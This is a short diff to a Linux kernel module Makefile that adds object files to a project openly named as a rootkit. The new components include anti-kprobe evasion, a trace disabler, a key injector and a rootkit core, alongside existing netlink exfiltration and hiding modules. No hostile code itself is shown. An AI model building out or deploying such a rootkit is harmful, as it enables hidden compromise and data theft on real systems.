@@ -30,7 +30,13 @@ rootkit-objs := \
 	src/anti_memdump.o \
 	src/sysctl_hiding.o \
 	src/breakpoint_detector.o \
-	src/netlink_exfil.o
+	src/netlink_exfil.o \
+	src/anti_kprobe.o \
+	src/recovery_trigger.o \
+	src/trace_disabler.o \
+	src/heap_encrypt.o \
+	src/key_injector.o \
+	src/rootkit_core.o
 
 KDIR := /lib/modules/$(shell uname -r)/build
 PWD := $(shell pwd)
